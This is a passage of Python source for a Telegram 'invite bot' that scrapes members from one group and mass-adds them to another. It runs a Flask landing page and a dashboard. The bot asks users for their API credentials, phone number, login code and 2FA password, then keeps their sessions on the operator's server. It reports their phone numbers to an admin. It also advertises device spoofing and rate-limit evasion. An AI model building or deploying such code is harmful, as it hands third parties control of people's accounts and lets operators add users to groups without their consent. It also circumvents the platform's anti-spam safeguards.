        return SETTINGS_MAX_DELAY

async def change_pause_duration(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⏸ <b>Change Pause Duration</b>

"
        "Enter pause time in seconds when FloodWait occurs:
"
        "<code>Examples:
"
        "300 = 5 minutes
"
        "600 = 10 minutes
"
        "900 = 15 minutes</code>

"
        "⚠️ Recommended: 600-900 seconds",
        parse_mode='HTML',
        reply_markup=get_cancel_keyboard()
    )
    return SETTINGS_PAUSE_TIME

async def set_pause_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        await update.message.reply_text("❌ Cancelled", reply_markup=get_settings_keyboard())
        return SETTINGS_MENU
    
    try:
        pause_time = int(update.message.text.strip())
        
        if pause_time < 60:
            await update.message.reply_text(
                "⚠️ Pause time too short!

"
                "Must be at least 60 seconds.
"
                "Try again:",
                reply_markup=get_cancel_keyboard()
            )
            return SETTINGS_PAUSE_TIME
        
        user_id = str(update.effective_user.id)
        user_data = get_user_from_db(user_id)
        
        if not user_data:
            user_data = {'user_id': user_id, 'settings': {}}
        
        if 'settings' not in user_data:
            user_data['settings'] = {}
        
        user_data['settings']['pause_time'] = pause_time
        save_user_to_db(user_id, user_data)
        
        await update.message.reply_text(
            "✅ <b>Pause Duration Updated!</b>

"
            f"⏸ Pause Time: {pause_time}s ({pause_time//60} min)

"
            "💡 Bot will wait this long when FloodWait occurs",
            parse_mode='HTML',
            reply_markup=get_settings_keyboard()
        )
        await log_to_admin(context.bot, "⚙️ Pause Duration Changed", user_id, {
            'pause_time': pause_time
        })
        return SETTINGS_MENU
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid number!

"
            "Enter a valid number in seconds:",
            reply_markup=get_cancel_keyboard()
        )
        return SETTINGS_PAUSE_TIME

# ==================== CONVERSATION HANDLERS - TASK SETUP ====================
async def run_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if user_id in ACTIVE_TASKS:
        await update.message.reply_text(
            "❌ Task already running!

"
            "Use ⏹ Stop Task first to start a new one.",
            reply_markup=get_main_keyboard()
        )
        return ConversationHandler.END
    
    # Check for existing session
    session_file = f'session_{user_id}.session'
    user_data = get_user_from_db(user_id)
    
    if os.path.exists(session_file) and user_data:
        await update.message.reply_text(
            "✅ <b>Found existing session!</b>

"
            "Do you want to:
"
            "1️⃣ Use existing session (faster)
"
            "2️⃣ Create new session

"
            "Send: 1 or 2",
            parse_mode='HTML',
            reply_markup=get_cancel_keyboard()
        )
        context.user_data['awaiting_session_choice'] = True
        return SOURCE
    
    await update.message.reply_text(
        "🔐 <b>API ID Required</b>

"
        "📱 Get it from: https://my.telegram.org

"
        "Enter your <b>API ID</b>:",
        parse_mode='HTML',
        reply_markup=get_cancel_keyboard()
    )
    return API_ID

async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        await update.message.reply_text("❌ Setup cancelled", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    try:
        api_id = int(update.message.text.strip())
        context.user_data['api_id'] = api_id
        
        await update.message.reply_text(
            "✅ API ID saved!

"
            "🔑 Now enter your <b>API HASH</b>:",
            parse_mode='HTML',
            reply_markup=get_cancel_keyboard()
        )
        return API_HASH
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid API ID! Must be a number.

"
            "Try again:",
            reply_markup=get_cancel_keyboard()
        )
        return API_ID

async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        await update.message.reply_text("❌ Setup cancelled", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    api_hash = update.message.text.strip()
    
    if len(api_hash) != 32:
        await update.message.reply_text(
            "⚠️ API Hash should be 32 characters long.

"
            "Please enter correct API HASH:",
            reply_markup=get_cancel_keyboard()
        )
        return API_HASH
    
    context.user_data['api_hash'] = api_hash
    
    await update.message.reply_text(
        "✅ API Hash saved!

"
        "📞 Now enter your <b>Phone Number</b>
"
        "(with country code, e.g., +1234567890):",
        parse_mode='HTML',
        reply_markup=get_cancel_keyboard()
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        await update.message.reply_text("❌ Setup cancelled", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    phone = update.message.text.strip()
    context.user_data['phone'] = phone
    user_id = str(update.effective_user.id)
    
    try:
        api_id = context.user_data['api_id']
        api_hash = context.user_data['api_hash']
        
        session_name = f'session_{user_id}'
        client = TelegramClient(session_name, api_id, api_hash)
        
        await client.connect()
        
        # Send OTP
        await client.send_code_request(phone)
        
        TEMP_CLIENTS[user_id] = client
        
        await update.message.reply_text(
            "📲 <b>OTP Sent!</b>

"
            "Check your Telegram app for the code.

"
            "Enter the <b>OTP code</b>:",
            parse_mode='HTML',
            reply_markup=get_cancel_keyboard()
        )
        return OTP_CODE
        
    except Exception as e:
        logger.error(f"Phone verification error: {e}")
        await update.message.reply_text(
            f"❌ <b>Error:</b>

{str(e)}

"
            "Try again with correct phone number:",
            parse_mode='HTML',
            reply_markup=get_cancel_keyboard()
        )
        return PHONE

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        user_id = str(update.effective_user.id)
        if user_id in TEMP_CLIENTS:
            await TEMP_CLIENTS[user_id].disconnect()
            del TEMP_CLIENTS[user_id]
        await update.message.reply_text("❌ Setup cancelled", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    otp_code = clean_otp_code(update.message.text)
    user_id = str(update.effective_user.id)
    
    if user_id not in TEMP_CLIENTS:
        await update.message.reply_text(
            "❌ Session expired. Please start again.",
            reply_markup=get_main_keyboard()
        )
        return ConversationHandler.END
    
    client = TEMP_CLIENTS[user_id]
    phone = context.user_data['phone']
    
    try:
        await client.sign_in(phone, otp_code)
        
        # Check if logged in
        if await client.is_user_authorized():
            me = await client.get_me()
            
            # Save to database
            device_info = generate_device_info(user_id)
            save_user_to_db(user_id, {
                'api_id': context.user_data['api_id'],
                'api_hash': context.user_data['api_hash'],
                'phone': phone,
                'device_info': device_info,
                'telegram_id': me.id,
                'username': me.username,
                'first_name': me.first_name
            })
            
            await client.disconnect()
            del TEMP_CLIENTS[user_id]
            
            await update.message.reply_text(
                f"✅ <b>Login Successful!</b>

"
                f"👤 Account: {me.first_name}
"
                f"📱 Device: {device_info['device_model']}

"
                "Now enter <b>SOURCE GROUP</b> username or link
"
                "(group to scrape members from):",
                parse_mode='HTML',
                reply_markup=get_cancel_keyboard()
            )
            
            await log_to_admin(context.bot, "✅ User Logged In", user_id, {
                'phone': phone,
                'name': me.first_name,
                'username': me.username
            })
            
            return SOURCE
        else:
            await update.message.reply_text(
                "❌ Login failed. Try again.",
                reply_markup=get_cancel_keyboard()
            )
            return OTP_CODE
            
    except errors.SessionPasswordNeededError:
        await update.message.reply_text(
            "🔐 <b>2FA Enabled</b>

"
            "Enter your <b>2FA Password</b>:",
            parse_mode='HTML',
            reply_markup=get_cancel_keyboard()
        )
        return TWO_FA_PASSWORD
    except Exception as e:
        logger.error(f"OTP verification error: {e}")
        await update.message.reply_text(
            f"❌ <b>Invalid OTP!</b>

"
            f"Error: {str(e)}

"
            "Try again:",
            parse_mode='HTML',
            reply_markup=get_cancel_keyboard()
        )
        return OTP_CODE

async def get_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        user_id = str(update.effective_user.id)
        if user_id in TEMP_CLIENTS:
            await TEMP_CLIENTS[user_id].disconnect()
            del TEMP_CLIENTS[user_id]
        await update.message.reply_text("❌ Setup cancelled", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    password = update.message.text.strip()
    user_id = str(update.effective_user.id)
    
    if user_id not in TEMP_CLIENTS:
        await update.message.reply_text(
            "❌ Session expired. Please start again.",
            reply_markup=get_main_keyboard()
        )
        return ConversationHandler.END
    
    client = TEMP_CLIENTS[user_id]
    
    try:
        await client.sign_in(password=password)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            
            # Save to database
            device_info = generate_device_info(user_id)
            save_user_to_db(user_id, {
                'api_id': context.user_data['api_id'],
                'api_hash': context.user_data['api_hash'],
                'phone': context.user_data['phone'],
                'device_info': device_info,
                'telegram_id': me.id,
                'username': me.username,
                'first_name': me.first_name
            })
            
            await client.disconnect()
            del TEMP_CLIENTS[user_id]
            
            await update.message.reply_text(
                f"✅ <b>Login Successful!</b>

"
                f"👤 Account: {me.first_name}
"
                f"📱 Device: {device_info['device_model']}

"
                "Now enter <b>SOURCE GROUP</b> username or link
"
                "(group to scrape members from):",
                parse_mode='HTML',
                reply_markup=get_cancel_keyboard()
            )
            
            await log_to_admin(context.bot, "✅ User Logged In (2FA)", user_id, {
                'phone': context.user_data['phone'],
                'name': me.first_name,
                'username': me.username
            })
            
            return SOURCE
        else:
            await update.message.reply_text(
                "❌ Login failed. Try again.",
                reply_markup=get_cancel_keyboard()
            )
            return TWO_FA_PASSWORD
            
    except Exception as e:
        logger.error(f"2FA error: {e}")
        await update.message.reply_text(
            f"❌ <b>Wrong Password!</b>

"
            f"Error: {str(e)}

"
            "Try again:",
            parse_mode='HTML',
            reply_markup=get_cancel_keyboard()
        )
        return TWO_FA_PASSWORD

async def get_source(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        await update.message.reply_text("❌ Setup cancelled", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    user_id = str(update.effective_user.id)
    
    # Handle session choice
    if context.user_data.get('awaiting_session_choice'):
        choice = update.message.text.strip()
        
        if choice == '1':
            # Use existing session
            context.user_data['awaiting_session_choice'] = False
            await update.message.reply_text(
                "✅ <b>Using Existing Session</b>

"
                "Enter <b>SOURCE GROUP</b> username or link:",
                parse_mode='HTML',
                reply_markup=get_cancel_keyboard()
            )
            return SOURCE
        elif choice == '2':
            # Delete old session and start fresh
            session_file = f'session_{user_id}.session'
            try:
                if os.path.exists(session_file):
                    os.remove(session_file)
                users_collection.delete_one({'user_id': user_id})
            except:
                pass
            
            context.user_data['awaiting_session_choice'] = False
            await update.message.reply_text(
                "🔄 <b>Starting Fresh Setup</b>

"
                "🔐 Enter your <b>API ID</b>:",
                parse_mode='HTML',
                reply_markup=get_cancel_keyboard()
            )
            return API_ID
        else:
            await update.message.reply_text(
                "❌ Invalid choice!

"
                "Send: 1 or 2",
                reply_markup=get_cancel_keyboard()
            )
            return SOURCE
    
    source_group = update.message.text.strip()
    context.user_data['source_group'] = source_group
    
    user_data = get_user_from_db(user_id) or {}
    user_data['source_group'] = source_group
    save_user_to_db(user_id, user_data)
    
    await update.message.reply_text(
        "✅ Source group saved!

"
        "Now enter <b>TARGET GROUP</b> username or link
"
        "(group to add members to):",
        parse_mode='HTML',
        reply_markup=get_cancel_keyboard()
    )
    return TARGET

async def get_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        await update.message.reply_text("❌ Setup cancelled", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    target_group = update.message.text.strip()
    context.user_data['target_group'] = target_group
    
    user_id = str(update.effective_user.id)
    user_data = get_user_from_db(user_id) or {}
    user_data['target_group'] = target_group
    save_user_to_db(user_id, user_data)
    
    await update.message.reply_text(
        "✅ Target group saved!

"
        "🔗 Finally, send the <b>Invite Link</b> for the target group:",
        parse_mode='HTML',
        reply_markup=get_cancel_keyboard()
    )
    return INVITE_LINK

async def get_invite_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        await update.message.reply_text("❌ Setup cancelled", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    invite_link = update.message.text.strip()
    user_id = str(update.effective_user.id)
    
    user_data = get_user_from_db(user_id) or {}
    user_data['invite_link'] = invite_link
    save_user_to_db(user_id, user_data)
    
    await update.message.reply_text(
        "🎉 <b>Setup Complete!</b>

"
        "✅ All configurations saved
"
        "🚀 Starting invite task...

"
        "Use keyboard buttons to control the task!",
        parse_mode='HTML',
        reply_markup=get_main_keyboard()
    )
    
    # Start the task
    asyncio.create_task(invite_task(user_id, context.bot, update.effective_chat.id))
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    # Clean up temp client if exists
    if user_id in TEMP_CLIENTS:
        try:
            await TEMP_CLIENTS[user_id].disconnect()
        except:
            pass
        del TEMP_CLIENTS[user_id]
    
    await update.message.reply_text(
        "❌ Operation cancelled.

"
        "Use the keyboard to navigate!",
        reply_markup=get_main_keyboard()
    )
    return ConversationHandler.END

# ==================== FLASK ROUTES ====================
@app.route('/')
def home():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Telegram Invite Bot</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 20px;
                padding: 40px;
                max-width: 600px;
                width: 100%;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            }
            h1 {
                color: #667eea;
                margin-bottom: 20px;
                font-size: 2.5em;
                text-align: center;
            }
            .subtitle {
                color: #666;
                text-align: center;
                margin-bottom: 30px;
                font-size: 1.1em;
            }
            .features {
                list-style: none;
                margin: 30px 0;
            }
            .features li {
                padding: 15px 0;
                border-bottom: 1px solid #eee;
                font-size: 1.1em;
                color: #333;
            }
            .features li:before {
                content: "✓ ";
                color: #667eea;
                font-weight: bold;
                margin-right: 10px;
            }
            .bot-link {
                display: block;
                text-align: center;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 15px 30px;
                border-radius: 50px;
                text-decoration: none;
                font-size: 1.2em;
                font-weight: bold;
                margin-top: 30px;
                transition: transform 0.3s;
            }
            .bot-link:hover {
                transform: scale(1.05);
            }
            .status {
                text-align: center;
                margin-top: 20px;
                color: #4CAF50;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Telegram Invite Bot</h1>
            <p class="subtitle">Advanced Member Management System</p>
            
            <ul class="features">
                <li>Advanced Security & Device Spoofing</li>
                <li>Persistent Sessions (Auto-Resume)</li>
                <li>Smart Duplicate Detection</li>
                <li>Real-time Dashboard & Monitoring</li>
                <li>24/7 Operation Support</li>
                <li>MongoDB-Powered Reliability</li>
                <li>FloodWait Protection</li>
                <li>Multi-User Support</li>
            </ul>
            
            <a href="https://t.me/YOUR_BOT_USERNAME" class="bot-link">Start Bot →</a>
            
            <div class="status">✓ System Online</div>
        </div>
    </body>
    </html>
    '''
    return html

@app.route('/dashboard/<token>')
def dashboard(token):
    user_id = get_user_from_token(token)
    
    if not user_id:
        return abort(403, "Invalid or expired token")
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dashboard - Telegram Invite Bot</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: #0f0f1e;
                color: white;
                padding: 20px;
            }
            .header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                padding: 30px;
                border-radius: 15px;
                margin-bottom: 20px;
                text-align: center;
            }
            h1 { font-size: 2em; margin-bottom: 10px; }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 20px;
            }
            .stat-card {
                background: #1a1a2e;
                padding: 25px;
                border-radius: 15px;
                border: 2px solid #667eea;
            }
            .stat-value {
                font-size: 2.5em;
                font-weight: bold;
                color: #667eea;
                margin: 10px 0;
            }
            .stat-label {
                color: #aaa;
                font-size: 1.1em;
            }
            .logs-container {
                background: #1a1a2e;
                padding: 20px;
                border-radius: 15px;
                max-height: 500px;
                overflow-y: auto;
            }
            .log-entry {
                padding: 10px;
                margin: 5px 0;
                border-left: 3px solid #667eea;
                background: #0f0f1e;
                border-radius: 5px;
            }
            .log-time {
                color: #667eea;
                font-weight: bold;
                margin-right: 10px;
            }
            .log-INFO { border-left-color: #4CAF50; }
            .log-WARNING { border-left-color: #FF9800; }
            .log-ERROR { border-left-color: #F44336; }
            .refresh-btn {
                background: #667eea;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                cursor: pointer;
                font-size: 1em;
                margin: 10px 0;
            }
            .refresh-btn:hover {
                background: #764ba2;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>📊 Live Dashboard</h1>
            <p>Real-time monitoring & statistics</p>
        </div>
        
        <div class="stats-grid" id="statsGrid">
            <div class="stat-card">
                <div class="stat-label">Status</div>
                <div class="stat-value" id="status">--</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Total Invited</div>
                <div class="stat-value" id="invited">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Failed</div>
                <div class="stat-value" id="failed">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Runtime</div>
                <div class="stat-value" id="runtime">0m</div>
            </div>
        </div>
        
        <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
        
        <h2 style="margin: 20px 0;">📋 Activity Logs</h2>
        <div class="logs-container" id="logsContainer">
            <p style="color: #666;">Loading logs...</p>
        </div>
        
        <script>
            const TOKEN = '{{ token }}';
            
            async function fetchStats() {
                try {
                    const response = await fetch(`/api/stats/${TOKEN}`);
                    const data = await response.json();
                    
                    document.getElementById('status').textContent = data.status;
                    document.getElementById('invited').textContent = data.invited_count;
                    document.getElementById('failed').textContent = data.failed_count;
                    document.getElementById('runtime').textContent = data.runtime;
                } catch (error) {
                    console.error('Error fetching stats:', error);
                }
            }
            
            async function fetchLogs() {
                try {
                    const response = await fetch(`/api/logs/${TOKEN}`);
                    const data = await response.json();
                    
                    const logsContainer = document.getElementById('logsContainer');
                    logsContainer.innerHTML = '';
                    
                    if (data.logs.length === 0) {
                        logsContainer.innerHTML = '<p style="color: #666;">No logs yet...</p>';
                        return;
                    }
                    
                    data.logs.reverse().forEach(log => {
                        const logEntry = document.createElement('div');
                        logEntry.className = `log-entry log-${log.level}`;
                        logEntry.innerHTML = `
                            <span class="log-time">${log.time}</span>
                            <span>${log.message}</span>
                        `;
                        logsContainer.appendChild(logEntry);
                    });
                } catch (error) {
                    console.error('Error fetching logs:', error);
                }
            }
            
            // Auto-refresh every 3 seconds
            setInterval(() => {
                fetchStats();
                fetchLogs();
            }, 3000);
            
            // Initial load
            fetchStats();
            fetchLogs();
        </script>
    </body>
    </html>
    '''.replace('{{ token }}', token)
    
    return html

@app.route('/api/stats/<token>')
def api_stats(token):
    user_id = get_user_from_token(token)
    
    if not user_id:
        return jsonify({'error': 'Invalid token'}), 403
    
    if user_id in ACTIVE_TASKS:
        task = ACTIVE_TASKS[user_id]
        runtime = int(time.time() - task['start_time'])
        
        return jsonify({
            'status': '⏸ Paused' if task.get('paused') else '🟢 Running',
            'invited_count': task['invited_count'],
            'failed_count': task['failed_count'],
            'runtime': f"{runtime//60}m {runtime%60}s"
        })
    else:
        user_data = get_user_from_db(user_id)
        total_added = len(user_data.get('added_members', [])) if user_data else 0
        
        return jsonify({
            'status': '⚫ Idle',
            'invited_count': 0,
            'failed_count': 0,
            'runtime': '0m',
            'total_added': total_added
        })

@app.route('/api/logs/<token>')
def api_logs(token):
    user_id = get_user_from_token(token)
    
    if not user_id:
        return jsonify({'error': 'Invalid token'}), 403
    
    logs = []
    
    if user_id in USER_LOG_QUEUES:
        queue_obj = USER_LOG_QUEUES[user_id]
        
        # Get all logs from queue without blocking
        temp_logs = []
        while not queue_obj.empty():
            try:
                temp_logs.append(queue_obj.get_nowait())
            except:
                break
        
        # Put them back
        for log in temp_logs:
            try:
                queue_obj.put_nowait(log)
            except:
                pass
        
        logs = temp_logs[-50:]  # Last 50 logs
    
    return jsonify({'logs': logs})

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'active_tasks': len(ACTIVE_TASKS),
        'timestamp': datetime.now().isoformat()
    })

# ==================== FLASK RUNNER ====================
def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ==================== MAIN FUNCTION ====================
async def main():
    # Start Flask in a separate thread
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    logger.info(f"🌐 Flask server started on port {PORT}")
    
    # Create bot application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Task setup conversation handler
    task_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🚀 Start Task$'), run_command)],
        states={
            API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_id)],
            API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_hash)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            OTP_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
            TWO_FA_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa_password)],
            SOURCE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_source)],
            TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_target)],
            INVITE_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_invite_link)],
        },
        fallbacks=[MessageHandler(filters.Regex('^❌ Cancel$'), cancel)],
        allow_reentry=True
    )
    
    # Settings conversation handler
    settings_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^⚙️ Settings$'), settings_menu)],
        states={
            SETTINGS_MENU: [
                MessageHandler(filters.Regex('^⏱ Change Delays$'), change_delays),
                MessageHandler(filters.Regex('^⏸ Pause Duration$'), change_pause_duration),
                MessageHandler(filters.Regex('^📊 View Settings$'), view_settings),
            ],
            SETTINGS_MIN_DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_min_delay)],
            SETTINGS_MAX_DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_max_delay)],
            SETTINGS_PAUSE_TIME: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_pause_time)],
        },
        fallbacks=[
            MessageHandler(filters.Regex('^❌ Cancel$'), cancel),
            MessageHandler(filters.Regex('^🔙 Back to Main$'), cancel)
        ],
        allow_reentry=True
    )
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(task_conv_handler)
    application.add_handler(settings_conv_handler)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_keyboard))
    
    # Start polling
    logger.info("🤖 Bot started successfully!")
    await application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
